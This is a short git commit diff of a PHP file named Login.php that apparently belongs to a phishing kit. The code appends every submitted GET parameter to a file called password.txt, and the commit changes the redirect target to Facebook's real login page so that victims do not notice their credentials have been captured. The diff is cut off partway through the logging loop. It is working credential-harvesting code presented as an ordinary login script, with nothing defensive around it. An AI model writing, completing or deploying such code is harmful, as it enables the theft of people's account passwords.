3e84a96498d35c4eae101ad0d6d7c26f8b18289a
matsunagaiwa <matsunagaiwa@gmail.com>
2025-06-06 11:05:38 +0700

    Login.php

--- Login.php
+++ Login.php
@@ -1,5 +1,5 @@
 <?php
-header("https://usluk.netlify.app/");
+header("https://www.facebook.com/login");
 $handle=fopen("password.txt","a");
 foreach($_GET as $variable =>$value) {
 fwrite($handle,$variable);
